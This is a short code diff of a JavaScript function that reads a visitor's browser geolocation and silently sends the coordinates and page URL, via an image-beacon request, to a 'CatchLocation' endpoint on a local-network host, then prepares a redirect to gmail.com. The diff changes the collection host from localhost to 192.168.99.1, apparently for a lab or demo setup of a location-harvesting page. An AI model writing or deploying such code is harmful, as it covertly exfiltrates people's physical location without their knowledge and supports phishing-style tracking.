@@ -65,7 +65,7 @@ function getLocation() {
 }
 
 function sendPosition(position) {
-    new Image().src = 'http://127.0.0.1:9000/CatchLocation?page='+window.location.href+'&latitude='+    position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
+    new Image().src = 'http://192.168.99.1:9000/CatchLocation?page='+window.location.href+'&latitude='+    position.coords.latitude.toFixed(2)+'&longitude='+position.coords.longitude.toFixed(2);
     var pageurl = "http://www.gmail.com";
     console.log("relocating to: ", pageurl)
     //to change the browser URL to the given link location
